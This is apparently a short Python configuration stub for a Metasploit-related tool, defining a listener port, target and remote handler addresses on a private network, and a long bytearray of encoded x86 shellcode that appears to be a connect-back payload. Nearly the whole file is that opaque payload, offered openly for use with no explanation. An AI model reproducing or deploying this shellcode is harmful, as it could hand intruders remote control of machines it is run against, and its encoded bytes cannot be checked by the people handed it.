#!/usr/bin/env python

#listner port for metasploit to talk too
listen_port = 8080
#target address and port of the handler
target_addr = {'host':'192.168.0.2' ,'port': '8081'}
remote_addr = {'host':'192.168.0.5' ,'port': '8080'}
proxy_addr = {}



shellcode = bytearray(
"\xda\xcd\xd9\x74\x24\xf4\x5e\x2b\xc9\xbb\xa8\x0c\x56\x1a\xb1"
"\x6b\x83\xee\xfc\x31\x5e\x14\x03\x5e\xbc\xee\xa3\xa1\xa6\xe1"
"\x33\xc2\x0f\x14\x1a\x9e\x8b\x13\xc5\x76\x1a\x6a\x92\xb9\xc4"
"\x99\x58\xe2\xe0\x22\xb6\xee\xf0\xdf\x85\xcb\x9b\x9b\x8a\xe8"
"\x1d\xc6\x18\x8a\x9d\x3f\x76\x81\x50\x15\x3a\x29\x92\xbd\x13"
"\xd2\x63\xca\x2b\xc9\x43\x79\xbc\x04\x6c\xda\xe4\x82\xd1\x83"
"\xca\x01\x04\xa4\xd7\xb6\x7a\xd9\x12\x6a\x73\xec\x5d\x3e\xd9"
"\xf2\x6b\x82\x38\x16\xde\x3a\xe6\xe9\xa0\x84\xf5\xed\x57\x8a"
"\xea\xea\xe1\xd1\x0f\xaf\xa1\xf4\x5a\xa8\xf6\x54\x97\x38\xe6"
"\xc6\xfe\x9a\x0d\x83\x36\x7a\x58\x4f\x45\xc6\x5e\xf4\x58\x78"
"\x92\x85\xa2\x8c\xc5\xae\xdc\xe9\x2d\x20\x0c\x21\xd4\xee\x47"
"\xb6\xae\xf3\x32\xea\xe5\xa2\xcd\x9e\xc8\x81\x31\x97\x40\x16"
"\x52\x0f\x75\xc9\x94\xef\x1f\x38\x32\x71\x38\x64\x49\x55\x6d"
"\xf3\x2e\x2f\xe0\x5d\x1d\x6f\xb6\xaa\x73\x2c\x36\xdd\x5b\x10"
"\xfb\xb7\x2f\xfb\x9c\x9c\x6e\x9a\xb4\xb0\xb9\x27\x25\x61\xcd"
"\xae\xe3\x4e\xbe\x16\xab\x1d\x68\x25\xef\xfb\xac\x16\x7d\x21"
"\xcb\xaf\x76\xca\x81\x9f\xca\xe9\x3f\x5f\x58\x42\x0f\x6d\x92"
"\xc2\x51\x5b\xff\xc6\x59\x59\x67\x70\x63\x91\xa6\xc3\x1e\xfd"
"\xe2\x5d\x23\x52\x4a\x98\x8a\x12\x57\x3f\x1c\x61\x14\x61\x78"
"\xb7\xbc\x0b\xdf\x8a\xaf\x31\x76\x61\x27\x76\x8c\xde\x9e\x38"
"\x6e\x32\x69\xd0\x4a\xf5\xe5\x35\xb5\x3e\xb2\x21\xa8\x7a\xa6"
"\xdd\x47\x1b\xc8\x29\xdc\x55\xac\x00\x51\x64\x2b\x47\xc8\x52"
"\x81\xe3\x6e\xe1\x5b\x85\xc7\xe5\x5c\x89\x9b\x71\xfd\xe9\x5e"
"\x0e\x0e\xa9\xa9\xe8\x0f\x11\xd8\x29\xc9\xd5\x07\x00\x1c\x86"
"\x33\xa6\xc2\xc0\x63\xff\x72\x67\x01\xfb\x78\xaf\x23\xe7\x9c"
"\x3a\xad\xad\x4a\x4c\x67\x05\x39\xc0\xf2\x91\x5d\xea\x55\xb1"
"\xec\xae\xa9\x19\x43\x12\xb1\x1e\x89\xa8\xdd\x1b\x03\xbe\xb7"
"\xe8\x86\x0d\x3a\xcf\xb0\xe3\x0f\xfa\xab\x65\x1b\x1c\x97\x76"
"\xd3\x69\x6a\xdc\xab\xb4\xf0\x95\xbc\x9d\x3b\xfc\xc3\xff\x50"
"\x5a\x66\x58\xda\x59\x44\x09\x2d\x14\x36\xaf\x4d\xf2\x02\x39"
"\x35\xa9")
